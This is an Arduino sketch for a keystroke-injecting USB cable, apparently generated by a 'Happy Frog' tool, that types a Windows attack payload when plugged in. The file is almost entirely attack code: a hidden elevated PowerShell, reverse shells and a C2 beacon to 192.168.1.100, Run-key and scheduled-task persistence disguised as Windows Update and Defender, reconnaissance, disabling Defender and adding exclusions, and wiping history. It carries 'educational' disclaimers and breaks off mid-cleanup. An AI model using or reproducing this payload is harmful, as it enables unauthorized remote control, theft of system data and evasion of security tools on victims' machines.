/*
Happy Frog - EvilCrow-Cable Production Code
HID Emulation Script - Runs immediately on boot

Device: EvilCrow-Cable
Processor: ATtiny85
Framework: Arduino (EvilCrow-Cable)
Mode: Production (immediate execution)

⚠️ PRODUCTION MODE: This code runs immediately when device boots!
⚠️ Use only for authorized testing and educational purposes!
*/

#include "DigiKeyboard.h"  // EvilCrow-Cable keyboard library
#include <SoftwareSerial.h> // For WiFi module
#define WIFI_RX 2
#define WIFI_TX 3
SoftwareSerial wifiSerial(WIFI_RX, WIFI_TX); // RX, TX

void setup() {
  // Initialize EvilCrow-Cable for stealth HID emulation
  DigiKeyboard.update();
  wifiSerial.begin(115200); // Start WiFi serial
  DigiKeyboard.delay(1000);  // Stealth startup delay
}

void loop() {
  // Production mode - execute payload immediately
  executePayload();
  while(true) { ; }
}

void executePayload() {
  // Generated Happy Frog payload for EvilCrow-Cable

  // Production code - main execution function
  // Wait for system to recognize the device
  DigiKeyboard.delay(2000);

  // EvilCrow-Cable Command: # 🔴 Red Team Initial Access EDUCATION ONLY - Happy Frog Script

  // EvilCrow-Cable Command: # Educational Demonstration: Rapid HID-based initial access and persistence

  // EvilCrow-Cable Command: #

  // EvilCrow-Cable Command: # NOTE: This is purposely broken to prevent some rando from using it.

  // EvilCrow-Cable Command: # Don't come at me. I want to teach people, I want to learn, and I

  // EvilCrow-Cable Command: # don't want to be the next worlds dumbest being called defendant

  // EvilCrow-Cable Command: # number 1. Sorry, but seriously. If you try running this as is,

  // EvilCrow-Cable Command: # if it runs at all, WD and UAC will just shut you down. Please learn.

  // EvilCrow-Cable Command: #

  // EvilCrow-Cable Command: # Educational Purpose: Demonstrates realistic red team techniques for:

  // EvilCrow-Cable Command: # - Rapid initial access via HID devices

  // EvilCrow-Cable Command: # - Reverse shell establishment

  // EvilCrow-Cable Command: # - Persistence mechanisms

  // EvilCrow-Cable Command: # - Stealth operations

  // EvilCrow-Cable Command: # - Defensive evasion

  // EvilCrow-Cable Command: #

  // EvilCrow-Cable Command: # ⚠️ CRITICAL: DON'T BE DUMB. Use ONLY on systems you own or have explicit written permission to test

  // EvilCrow-Cable Command: # This demonstrates realistic attack vectors for educational and authorized testing purposes

  // EvilCrow-Cable Command: # NEVER use this on production systems or without proper authorization

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # SECTION 1: STEALTH INITIALIZATION

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # Enable production mode for immediate execution

  // EvilCrow-Cable Command: # ATTACKMODE HID STORAGE

  // EvilCrow-Cable Command: # Set minimal delays for rapid execution

  // EvilCrow-Cable Command: DEFAULT_DELAY 100
  // DEFAULT_DELAY: Set default delay to 100ms between commands
  int default_delay = 100;  // Default delay in milliseconds

  // EvilCrow-Cable Command: # Wait for system recognition (minimal delay for stealth)

  // EvilCrow-Cable Command: DELAY 1500
  DigiKeyboard.delay(1500);  // EvilCrow-Cable delay: 1500ms

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # SECTION 2: RAPID INITIAL ACCESS

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # Open hidden PowerShell with elevated privileges

  // EvilCrow-Cable Command: MOD r
  // EvilCrow-Cable stealth modifier combo
  DigiKeyboard.sendKeyPress(KEY_GUI);  // Press MOD
  DigiKeyboard.sendKeyPress(KEY_R);  // Press r

  // EvilCrow-Cable Command: DELAY 200
  DigiKeyboard.delay(200);  // EvilCrow-Cable delay: 200ms

  // EvilCrow-Cable Command: STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs -WindowStyle Hidden"
  DigiKeyboard.print("powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs -WindowStyle Hidden"");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 800
  DigiKeyboard.delay(800);  // EvilCrow-Cable delay: 800ms

  // EvilCrow-Cable Command: # Wait for UAC prompt and auto-accept (if possible)

  // EvilCrow-Cable Command: DELAY 1000
  DigiKeyboard.delay(1000);  // EvilCrow-Cable delay: 1000ms

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # SECTION 3: ESTABLISH REVERSE SHELL

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # Create reverse shell connection (educational example)

  // EvilCrow-Cable Command: # Note: This uses a non-functional example IP for demonstration

  // EvilCrow-Cable Command: STRING $client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", 4444)
  DigiKeyboard.print("$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", 4444)");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: STRING $stream = $client.GetStream()
  DigiKeyboard.print("$stream = $client.GetStream()");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: STRING $reader = New-Object System.IO.StreamReader($stream)
  DigiKeyboard.print("$reader = New-Object System.IO.StreamReader($stream)");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: STRING $writer = New-Object System.IO.StreamWriter($stream)
  DigiKeyboard.print("$writer = New-Object System.IO.StreamWriter($stream)");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: STRING $writer.AutoFlush = $true
  DigiKeyboard.print("$writer.AutoFlush = $true");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: # Create hidden command prompt for reverse shell

  // EvilCrow-Cable Command: STRING Start-Process cmd -WindowStyle Hidden -ArgumentList "/c", "powershell -WindowStyle Hidden -Command `"while(`$true) { `$response = `$reader.ReadLine(); if(`$response -eq 'exit') { break }; `$output = Invoke-Expression `$response 2>&1; `$writer.WriteLine(`$output) }`""
  DigiKeyboard.print("Start-Process cmd -WindowStyle Hidden -ArgumentList "/c", "powershell -WindowStyle Hidden -Command `"while(`$true) { `$response = `$reader.ReadLine(); if(`$response -eq 'exit') { break }; `$output = Invoke-Expression `$response 2>&1; `$writer.WriteLine(`$output) }`""");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 200
  DigiKeyboard.delay(200);  // EvilCrow-Cable delay: 200ms

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # SECTION 4: ESTABLISH PERSISTENCE

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # Create startup persistence via registry

  // EvilCrow-Cable Command: STRING New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:APPDATA\update.ps1`"" -PropertyType String -Force
  DigiKeyboard.print("New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:APPDATA\update.ps1`"" -PropertyType String -Force");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 200
  DigiKeyboard.delay(200);  // EvilCrow-Cable delay: 200ms

  // EvilCrow-Cable Command: # Create persistent PowerShell script

  // EvilCrow-Cable Command: STRING Set-Content -Path "$env:APPDATA\update.ps1" -Value "while(`$true) { try { `$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100', 4444); `$stream = `$client.GetStream(); `$reader = New-Object System.IO.StreamReader(`$stream); `$writer = New-Object System.IO.StreamWriter(`$stream); `$writer.AutoFlush = `$true; while(`$true) { `$response = `$reader.ReadLine(); if(`$response -eq 'exit') { break }; `$output = Invoke-Expression `$response 2>&1; `$writer.WriteLine(`$output) } } catch { Start-Sleep 30 } }" -Force
  DigiKeyboard.print("Set-Content -Path "$env:APPDATA\update.ps1" -Value "while(`$true) { try { `$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100', 4444); `$stream = `$client.GetStream(); `$reader = New-Object System.IO.StreamReader(`$stream); `$writer = New-Object System.IO.StreamWriter(`$stream); `$writer.AutoFlush = `$true; while(`$true) { `$response = `$reader.ReadLine(); if(`$response -eq 'exit') { break }; `$output = Invoke-Expression `$response 2>&1; `$writer.WriteLine(`$output) } } catch { Start-Sleep 30 } }" -Force");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 200
  DigiKeyboard.delay(200);  // EvilCrow-Cable delay: 200ms

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # SECTION 5: ESTABLISH ALTERNATE PERSISTENCE

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # Create scheduled task for additional persistence

  // EvilCrow-Cable Command: STRING schtasks /create /tn "WindowsDefender" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:APPDATA\defender.ps1`"" /sc onlogon /ru System /f
  DigiKeyboard.print("schtasks /create /tn "WindowsDefender" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:APPDATA\defender.ps1`"" /sc onlogon /ru System /f");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 300
  DigiKeyboard.delay(300);  // EvilCrow-Cable delay: 300ms

  // EvilCrow-Cable Command: # Create alternate persistent script

  // EvilCrow-Cable Command: STRING Set-Content -Path "$env:APPDATA\defender.ps1" -Value "Start-Sleep 60; while(`$true) { try { `$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100', 4445); `$stream = `$client.GetStream(); `$reader = New-Object System.IO.StreamReader(`$stream); `$writer = New-Object System.IO.StreamWriter(`$stream); `$writer.AutoFlush = `$true; while(`$true) { `$response = `$reader.ReadLine(); if(`$response -eq 'exit') { break }; `$output = Invoke-Expression `$response 2>&1; `$writer.WriteLine(`$output) } } catch { Start-Sleep 60 } }" -Force
  DigiKeyboard.print("Set-Content -Path "$env:APPDATA\defender.ps1" -Value "Start-Sleep 60; while(`$true) { try { `$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100', 4445); `$stream = `$client.GetStream(); `$reader = New-Object System.IO.StreamReader(`$stream); `$writer = New-Object System.IO.StreamWriter(`$stream); `$writer.AutoFlush = `$true; while(`$true) { `$response = `$reader.ReadLine(); if(`$response -eq 'exit') { break }; `$output = Invoke-Expression `$response 2>&1; `$writer.WriteLine(`$output) } } catch { Start-Sleep 60 } }" -Force");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 200
  DigiKeyboard.delay(200);  // EvilCrow-Cable delay: 200ms

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # SECTION 6: INFORMATION GATHERING

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # Gather system information stealthily

  // EvilCrow-Cable Command: STRING $sysinfo = Get-ComputerInfo | ConvertTo-Json
  DigiKeyboard.print("$sysinfo = Get-ComputerInfo | ConvertTo-Json");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: STRING $netinfo = Get-NetIPAddress | ConvertTo-Json
  DigiKeyboard.print("$netinfo = Get-NetIPAddress | ConvertTo-Json");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: STRING $userinfo = Get-LocalUser | ConvertTo-Json
  DigiKeyboard.print("$userinfo = Get-LocalUser | ConvertTo-Json");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: # Save information to hidden file

  // EvilCrow-Cable Command: STRING Set-Content -Path "$env:APPDATA\system_info.json" -Value "{ 'computer': $sysinfo, 'network': $netinfo, 'users': $userinfo }" -Force
  DigiKeyboard.print("Set-Content -Path "$env:APPDATA\system_info.json" -Value "{ 'computer': $sysinfo, 'network': $netinfo, 'users': $userinfo }" -Force");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 200
  DigiKeyboard.delay(200);  // EvilCrow-Cable delay: 200ms

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # SECTION 7: ESTABLISH COVERT CHANNELS

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # Create hidden directory for data exfiltration

  // EvilCrow-Cable Command: STRING New-Item -Path "$env:APPDATA\Microsoft\Windows\Update" -ItemType Directory -Force
  DigiKeyboard.print("New-Item -Path "$env:APPDATA\Microsoft\Windows\Update" -ItemType Directory -Force");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: # Set directory to hidden

  // EvilCrow-Cable Command: STRING attrib +h "$env:APPDATA\Microsoft\Windows\Update"
  DigiKeyboard.print("attrib +h "$env:APPDATA\Microsoft\Windows\Update"");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: # Create data collection script

  // EvilCrow-Cable Command: STRING Set-Content -Path "$env:APPDATA\Microsoft\Windows\Update\collect.ps1" -Value "while(`$true) { try { `$processes = Get-Process | Select-Object Name, Id, CPU, WorkingSet | ConvertTo-Json; `$services = Get-Service | Select-Object Name, Status, StartType | ConvertTo-Json; `$data = @{ 'timestamp' = (Get-Date).ToString(); 'processes' = `$processes; 'services' = `$services }; `$data | ConvertTo-Json | Out-File `"$env:APPDATA\Microsoft\Windows\Update\data.json`" -Force; Start-Sleep 300 } catch { Start-Sleep 300 } }" -Force
  DigiKeyboard.print("Set-Content -Path "$env:APPDATA\Microsoft\Windows\Update\collect.ps1" -Value "while(`$true) { try { `$processes = Get-Process | Select-Object Name, Id, CPU, WorkingSet | ConvertTo-Json; `$services = Get-Service | Select-Object Name, Status, StartType | ConvertTo-Json; `$data = @{ 'timestamp' = (Get-Date).ToString(); 'processes' = `$processes; 'services' = `$services }; `$data | ConvertTo-Json | Out-File `"$env:APPDATA\Microsoft\Windows\Update\data.json`" -Force; Start-Sleep 300 } catch { Start-Sleep 300 } }" -Force");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 200
  DigiKeyboard.delay(200);  // EvilCrow-Cable delay: 200ms

  // EvilCrow-Cable Command: # Start data collection in background

  // EvilCrow-Cable Command: STRING Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$env:APPDATA\Microsoft\Windows\Update\collect.ps1`""
  DigiKeyboard.print("Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$env:APPDATA\Microsoft\Windows\Update\collect.ps1`""");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 200
  DigiKeyboard.delay(200);  // EvilCrow-Cable delay: 200ms

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # SECTION 8: ESTABLISH REMOTE ACCESS

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # Create remote access script with multiple fallback methods

  // EvilCrow-Cable Command: STRING Set-Content -Path "$env:APPDATA\remote_access.ps1" -Value "function Establish-RemoteAccess { param(`$target) try { `$client = New-Object System.Net.Sockets.TCPClient(`$target, 4444); return `$client } catch { try { `$client = New-Object System.Net.Sockets.TCPClient(`$target, 4445); return `$client } catch { try { `$client = New-Object System.Net.Sockets.TCPClient(`$target, 8080); return `$client } catch { return `$null } } } } while(`$true) { `$client = Establish-RemoteAccess '192.168.1.100'; if(`$client) { `$stream = `$client.GetStream(); `$reader = New-Object System.IO.StreamReader(`$stream); `$writer = New-Object System.IO.StreamWriter(`$stream); `$writer.AutoFlush = `$true; while(`$true) { `$response = `$reader.ReadLine(); if(`$response -eq 'exit') { break }; `$output = Invoke-Expression `$response 2>&1; `$writer.WriteLine(`$output) } } Start-Sleep 30 }" -Force
  DigiKeyboard.print("Set-Content -Path "$env:APPDATA\remote_access.ps1" -Value "function Establish-RemoteAccess { param(`$target) try { `$client = New-Object System.Net.Sockets.TCPClient(`$target, 4444); return `$client } catch { try { `$client = New-Object System.Net.Sockets.TCPClient(`$target, 4445); return `$client } catch { try { `$client = New-Object System.Net.Sockets.TCPClient(`$target, 8080); return `$client } catch { return `$null } } } } while(`$true) { `$client = Establish-RemoteAccess '192.168.1.100'; if(`$client) { `$stream = `$client.GetStream(); `$reader = New-Object System.IO.StreamReader(`$stream); `$writer = New-Object System.IO.StreamWriter(`$stream); `$writer.AutoFlush = `$true; while(`$true) { `$response = `$reader.ReadLine(); if(`$response -eq 'exit') { break }; `$output = Invoke-Expression `$response 2>&1; `$writer.WriteLine(`$output) } } Start-Sleep 30 }" -Force");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 200
  DigiKeyboard.delay(200);  // EvilCrow-Cable delay: 200ms

  // EvilCrow-Cable Command: # Start remote access service

  // EvilCrow-Cable Command: STRING Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$env:APPDATA\remote_access.ps1`""
  DigiKeyboard.print("Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$env:APPDATA\remote_access.ps1`""");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 200
  DigiKeyboard.delay(200);  // EvilCrow-Cable delay: 200ms

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # SECTION 9: CLEANUP AND STEALTH

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # Clear PowerShell history

  // EvilCrow-Cable Command: STRING Clear-History
  DigiKeyboard.print("Clear-History");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: # Clear command history

  // EvilCrow-Cable Command: STRING Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
  DigiKeyboard.print("Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: # Disable Windows Defender real-time protection (temporarily)

  // EvilCrow-Cable Command: STRING Set-MpPreference -DisableRealtimeMonitoring `$true
  DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring `$true");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 200
  DigiKeyboard.delay(200);  // EvilCrow-Cable delay: 200ms

  // EvilCrow-Cable Command: # Add exclusion for our files

  // EvilCrow-Cable Command: STRING Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\Windows\Update"
  DigiKeyboard.print("Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\Windows\Update"");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: STRING Add-MpPreference -ExclusionPath "$env:APPDATA\update.ps1"
  DigiKeyboard.print("Add-MpPreference -ExclusionPath "$env:APPDATA\update.ps1"");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: STRING Add-MpPreference -ExclusionPath "$env:APPDATA\defender.ps1"
  DigiKeyboard.print("Add-MpPreference -ExclusionPath "$env:APPDATA\defender.ps1"");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # SECTION 10: FINAL PERSISTENCE CHECKS

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # Verify persistence mechanisms

  // EvilCrow-Cable Command: STRING Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate"
  DigiKeyboard.print("Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate"");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: STRING Get-ScheduledTask -TaskName "WindowsDefender" -ErrorAction SilentlyContinue
  DigiKeyboard.print("Get-ScheduledTask -TaskName "WindowsDefender" -ErrorAction SilentlyContinue");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: # Check if our processes are running

  // EvilCrow-Cable Command: STRING Get-Process | Where-Object { `$_.ProcessName -eq 'powershell' } | Select-Object Id, ProcessName, StartTime
  DigiKeyboard.print("Get-Process | Where-Object { `$_.ProcessName -eq 'powershell' } | Select-Object Id, ProcessName, StartTime");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 200
  DigiKeyboard.delay(200);  // EvilCrow-Cable delay: 200ms

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # SECTION 11: ESTABLISH COMMAND & CONTROL

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # Create C2 communication script

  // EvilCrow-Cable Command: STRING Set-Content -Path "$env:APPDATA\c2.ps1" -Value "function Send-Data { param(`$data) try { `$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100', 4446); `$stream = `$client.GetStream(); `$writer = New-Object System.IO.StreamWriter(`$stream); `$writer.AutoFlush = `$true; `$writer.WriteLine(`$data); `$client.Close() } catch { } } while(`$true) { `$hostname = `$env:COMPUTERNAME; `$username = `$env:USERNAME; `$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { `$_.IPAddress -notlike '127.*' -and `$_.IPAddress -notlike '169.*' }).IPAddress[0]; `$status = @{ 'hostname' = `$hostname; 'username' = `$username; 'ip' = `$ip; 'timestamp' = (Get-Date).ToString(); 'status' = 'active' }; Send-Data (`$status | ConvertTo-Json); Start-Sleep 300 }" -Force
  DigiKeyboard.print("Set-Content -Path "$env:APPDATA\c2.ps1" -Value "function Send-Data { param(`$data) try { `$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100', 4446); `$stream = `$client.GetStream(); `$writer = New-Object System.IO.StreamWriter(`$stream); `$writer.AutoFlush = `$true; `$writer.WriteLine(`$data); `$client.Close() } catch { } } while(`$true) { `$hostname = `$env:COMPUTERNAME; `$username = `$env:USERNAME; `$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { `$_.IPAddress -notlike '127.*' -and `$_.IPAddress -notlike '169.*' }).IPAddress[0]; `$status = @{ 'hostname' = `$hostname; 'username' = `$username; 'ip' = `$ip; 'timestamp' = (Get-Date).ToString(); 'status' = 'active' }; Send-Data (`$status | ConvertTo-Json); Start-Sleep 300 }" -Force");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 200
  DigiKeyboard.delay(200);  // EvilCrow-Cable delay: 200ms

  // EvilCrow-Cable Command: # Start C2 communication

  // EvilCrow-Cable Command: STRING Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$env:APPDATA\c2.ps1`""
  DigiKeyboard.print("Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$env:APPDATA\c2.ps1`""");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 200
  DigiKeyboard.delay(200);  // EvilCrow-Cable delay: 200ms

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # SECTION 12: FINAL STEALTH MEASURES

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # Minimize all windows to hide activity

  // EvilCrow-Cable Command: STRING (New-Object -ComObject Shell.Application).MinimizeAll()
  DigiKeyboard.print("(New-Object -ComObject Shell.Application).MinimizeAll()");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: # Clear recent files

  // EvilCrow-Cable Command: STRING Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
  DigiKeyboard.print("Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: # Clear temporary files

